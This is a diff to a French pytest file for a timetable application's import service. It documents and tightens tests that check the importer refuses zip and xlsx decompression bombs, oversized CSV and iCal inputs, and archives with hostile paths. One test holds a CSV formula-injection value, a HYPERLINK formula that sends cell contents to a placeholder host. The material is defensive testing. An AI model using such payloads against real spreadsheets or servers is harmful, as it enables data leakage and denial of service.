@@ -39,26 +39,39 @@ from edt.erreurs import ErreurIntrouvable
 from edt.services import echange as service
 from edt.services.echange import ModeImport, OptionsImport
 
+pytestmark = pytest.mark.cas_limite
+
 # --------------------------------------------------------------------------- #
 # Archive bombe
 # --------------------------------------------------------------------------- #
 
 
 def test_archive_bombe_refusee_avant_decompression():
-    """40 Ko qui feraient 21 Mo de retours à la ligne une fois décompressés."""
+    """Cas : une archive ZIP de 40 Ko qui ferait 21 Mo de retours à la ligne une fois décompressée.
+
+    Risque : la décompression remplit la mémoire du serveur avant tout contrôle de taille.
+    """
     bombe = archive_zip({"salles.csv": b"code;campus\n" + b"\n" * (21 * 1024 * 1024)})
     assert len(bombe) < 100 * 1024
 
-    debut = time.perf_counter()
-    lu, signalements = lire_fichier(FichierEnvoye("bombe.zip", bombe))
+    def decompression_interdite(*_args, **_options):
+        raise AssertionError("membre décompressé avant le contrôle de taille")
 
-    assert time.perf_counter() - debut < 2
+    with pytest.MonkeyPatch.context() as patch:
+        patch.setattr(zipfile.ZipFile, "read", decompression_interdite)
+        lu, signalements = lire_fichier(FichierEnvoye("bombe.zip", bombe))
+
     assert lu.tableaux == ()
     (message,) = erreurs(signalements)
     assert "Archive ZIP refusé" in message and "décompressé" in message and "20 Mo" in message
 
 
 def test_archive_de_plus_de_50_fichiers_refusee():
+    """Cas : une archive de 51 fichiers CSV.
+
+    Risque : des milliers de petits membres occupent le serveur ; le refus doit citer leur
+    nombre.
+    """
     archive = archive_zip({f"salles_{i}.csv": b"code;campus\nN1;NDC\n" for i in range(51)})
     lu, signalements = lire_fichier(FichierEnvoye("trop.zip", archive))
     assert lu.tableaux == ()
@@ -66,6 +79,11 @@ def test_archive_de_plus_de_50_fichiers_refusee():
 
 
 def test_membre_abime_signale_sans_planter():
+    """Cas : une archive dont un membre est abîmé (octet corrompu dans les données compressées).
+
+    Risque : erreur de décompression non capturée : tout l'import échoue, le membre sain
+    compris.
+    """
     contenu = archive_zip(
         {"campus.csv": b"code;nom\n" + b"NDC;Notre-Dame\n" * 200, "salles.csv": b"code\n"}
     )
@@ -78,6 +96,10 @@ def test_membre_abime_signale_sans_planter():
 
 
 def test_classeur_bombe_refuse_avant_openpyxl():
+    """Cas : un classeur .xlsx dont une partie interne ferait 21 Mo une fois décompressée.
+
+    Risque : openpyxl décompresse tout en mémoire avant que la taille soit contrôlée.
+    """
     bombe = archive_zip(
         {
             "[Content_Types].xml": b"<Types/>",
@@ -91,6 +113,10 @@ def test_classeur_bombe_refuse_avant_openpyxl():
 
 
 def test_le_gabarit_reste_sous_les_bornes_d_un_classeur(base):
+    """Cas : le gabarit vide produit par l'application, relu par la lecture.
+
+    Risque : une borne trop basse refuse le propre gabarit de l'application.
+    """
     with session_base() as session:
         gabarit = service.produire_gabarit(session, "xlsx")
     with zipfile.ZipFile(io.BytesIO(gabarit.contenu)) as archive:
@@ -105,16 +131,22 @@ def test_le_gabarit_reste_sous_les_bornes_d_un_classeur(base):
 
 
 def test_fichier_de_retours_a_la_ligne_refuse_sans_tout_lire():
-    """19 Mo de lignes vides : la lecture s'arrête à 100 000 lignes lues."""
+    """Cas : 19 Mo de lignes vides dans un CSV.
+
+    Risque : toutes les lignes lues avant le refus : serveur occupé pour rien ; la lecture doit
+    s'arrêter à `MAX_LIGNES_LUES`.
+    """
     texte = b"libelle;date_debut;date_fin\n" + b"\n" * (19 * 1024 * 1024)
-    debut = time.perf_counter()
     lu, signalements = lire_fichier(FichierEnvoye("annees.csv", texte))
-    assert time.perf_counter() - debut < 5
     assert lu.tableaux == ()
     assert f"plus de {lecture.MAX_LIGNES_LUES} lignes" in erreurs(signalements)[0]
 
 
 def test_tableau_trop_long_refuse_avec_un_message_clair():
+    """Cas : un tableau d'une ligne de plus que `MAX_LIGNES_TABLEAU`.
+
+    Risque : tableau tronqué en silence, ou refus sans dire quoi faire (découper l'envoi).
+    """
     lignes = "".join(f"A{i};x;y\n" for i in range(lecture.MAX_LIGNES_TABLEAU + 1))
     lu, signalements = lire_fichier(
         FichierEnvoye("annees.csv", ("libelle;a;b\n" + lignes).encode())
@@ -126,6 +158,11 @@ def test_tableau_trop_long_refuse_avec_un_message_clair():
 
 
 def test_budget_de_lignes_partage_par_l_envoi():
+    """Cas : deux fichiers d'un même envoi qui, ensemble, dépassent le nombre de lignes admis.
+
+    Risque : la borne par fichier contournée en découpant un envoi hostile en plusieurs
+    fichiers.
+    """
     limites = Limites(lignes_restantes=5)
     premier, _ = lire_fichier(FichierEnvoye("a.csv", b"code;nom\n" + b"A;a\n" * 3), limites)
     second, signalements = lire_fichier(
@@ -136,6 +173,10 @@ def test_budget_de_lignes_partage_par_l_envoi():
 
 
 def test_trop_de_colonnes_et_cellule_geante():
+    """Cas : une ligne de 600 colonnes, puis une cellule de 200 000 caractères.
+
+    Risque : mémoire et page de résultat démesurées, ou erreur brute du lecteur CSV.
+    """
     large = lire_fichier(FichierEnvoye("x.csv", b"code;nom\n" + b";" * 600 + b"z\n"))
     assert "colonnes" in erreurs(large[1])[0]
     geante = lire_fichier(FichierEnvoye("x.csv", b'code;nom\nA;"' + b"x" * 200_000 + b'"\n'))
@@ -143,6 +184,11 @@ def test_trop_de_colonnes_et_cellule_geante():
 
 
 def test_ical_trop_d_evenements_ou_regle_trop_dense(monkeypatch):
+    """Cas : un agenda iCal de trop d'événements, une règle à la minute, une règle quotidienne sans
+    fin.
+
+    Risque : des millions d'occurrences développées : serveur occupé, mémoire épuisée.
+    """
     evenement = "BEGIN:VEVENT\nUID:{0}\nDTSTAMP:20260901T000000Z\nDTSTART:20261005T083000\nDTEND:20261005T103000\n{1}END:VEVENT\n"
     texte = "BEGIN:VCALENDAR\nVERSION:2.0\nPRODID:-//t//FR\n{}END:VCALENDAR\n"
     monkeypatch.setattr(ical, "MAX_EVENEMENTS", 2)
@@ -163,6 +209,11 @@ def test_ical_trop_d_evenements_ou_regle_trop_dense(monkeypatch):
 
 
 def test_signalements_bornes_et_comptes():
+    """Cas : plus de signalements que la liste n'en garde.
+
+    Risque : les signalements omis disparaissent sans être comptés : le rapport sous-estime les
+    erreurs.
+    """
     liste = ListeSignalements(maximum=2)
     liste.extend(Signalement(Gravite.ERREUR, f"ligne {i}") for i in range(5))
     liste.append(Signalement(Gravite.INFORMATION, "info"))
@@ -184,6 +235,11 @@ def test_signalements_bornes_et_comptes():
 def test_formules_neutralisees_dans_les_csv_et_relues_a_l_identique(
     jeu_minimal, importer, exporter
 ):
+    """Cas : un libellé qui commence par « = » (formule) exporté en CSV, puis réimporté.
+
+    Risque : la formule s'exécute à l'ouverture dans un tableur ; ou la neutralisation change la
+    valeur au réimport.
+    """
     formule = '=HYPERLINK("http://exemple.invalid/?x="&A1;"clic")'
     with session_base() as session:
         matiere = session.scalar(select(m.Matiere).where(m.Matiere.code == "IM.1101"))
@@ -204,6 +260,10 @@ def test_formules_neutralisees_dans_les_csv_et_relues_a_l_identique(
 
 
 def test_import_d_emploi_du_temps_limite_aussi_l_ical(jeu_minimal, importer, monkeypatch):
+    """Cas : un import d'emploi du temps iCal au-delà de `MAX_EVENEMENTS` événements.
+
+    Risque : la borne du lecteur iCal ignorée par le chemin d'import d'un emploi du temps.
+    """
     monkeypatch.setattr(ical, "MAX_EVENEMENTS", 1)
     texte = (
         "BEGIN:VCALENDAR\nVERSION:2.0\nPRODID:-//t//FR\n"
@@ -231,7 +291,6 @@ ENORME = 10**20
 """Au-delà des entiers de SQLite (2**63 - 1) : ferait planter le flush."""
 
 
-@pytest.mark.cas_limite
 @pytest.mark.parametrize("simuler", [True, False], ids=["simulation", "application"])
 @pytest.mark.parametrize(
     ("nom", "entete", "valide", "enorme", "colonne", "modele"),
@@ -282,7 +341,6 @@ def test_entier_hors_bornes_sqlite_rejette_la_ligne_sans_planter(
     assert compter(modele) == avant + (0 if simuler else 1)
 
 
-@pytest.mark.cas_limite
 def test_debordement_d_entier_de_sqlite_rejette_sa_ligne_seule(jeu_minimal, importer, monkeypatch):
     """Cas : un entier au-delà de 2**63 atteint la base (borne de lecture levée pour le test).
 
@@ -302,7 +360,6 @@ def test_debordement_d_entier_de_sqlite_rejette_sa_ligne_seule(jeu_minimal, impo
     assert compter(m.Salle) == jeu_minimal.nb_salles + 2
 
 
-@pytest.mark.cas_limite
 def test_import_reserve_la_base_des_son_ouverture(jeu_minimal, environnement):
     """Cas : une autre connexion veut écrire pendant qu'un import a ouvert sa transaction.
 
@@ -320,7 +377,6 @@ def test_import_reserve_la_base_des_son_ouverture(jeu_minimal, environnement):
             autre.close()
 
 
-@pytest.mark.cas_limite
 def test_deux_imports_simultanes_sont_serialises_sans_erreur(jeu_minimal):
     """Cas : deux imports appliqués au même moment (deux onglets du navigateur).
 
@@ -359,7 +415,6 @@ def test_deux_imports_simultanes_sont_serialises_sans_erreur(jeu_minimal):
 
 
 @pytest.mark.perf
-@pytest.mark.cas_limite
 def test_import_de_dix_mille_lignes_valides_sous_le_seuil(jeu_minimal, importer):
     """Cas : un fichier de 10 000 enseignants valides, simulé (un point de sauvegarde par ligne).
 
@@ -378,7 +433,6 @@ def test_import_de_dix_mille_lignes_valides_sous_le_seuil(jeu_minimal, importer)
     assert duree < 30, f"{duree:.1f} s"
 
 
-@pytest.mark.cas_limite
 def test_archive_aux_chemins_hostiles_lue_sans_ecriture_sur_disque(
     base, importer, environnement, monkeypatch
 ):
@@ -408,7 +462,6 @@ def test_archive_aux_chemins_hostiles_lue_sans_ecriture_sur_disque(
     assert noms and all(".." not in nom and ":" not in nom for nom in noms), noms
 
 
-@pytest.mark.cas_limite
 def test_lecture_ical_faite_avant_de_reserver_la_base(
     jeu_minimal, importer, fichier_exemple, environnement, monkeypatch
 ):
@@ -450,7 +503,6 @@ def test_lecture_ical_faite_avant_de_reserver_la_base(
     assert ordre == ["lecture iCal", "transaction"]
 
 
-@pytest.mark.cas_limite
 def test_budget_de_calcul_ical_partage_par_l_envoi(jeu_minimal, importer, monkeypatch):
     """Cas : un envoi de quatre fichiers iCal, chacun aux récurrences coûteuses.
 
@@ -477,7 +529,6 @@ def test_budget_de_calcul_ical_partage_par_l_envoi(jeu_minimal, importer, monkey
     assert refuses == {"agenda3.ics", "agenda4.ics"}  # les deux premiers ont tout consommé
 
 
-@pytest.mark.cas_limite
 def test_service_appele_avec_un_identifiant_hors_base_repond_introuvable(
     jeu_minimal, fichier_exemple
 ):
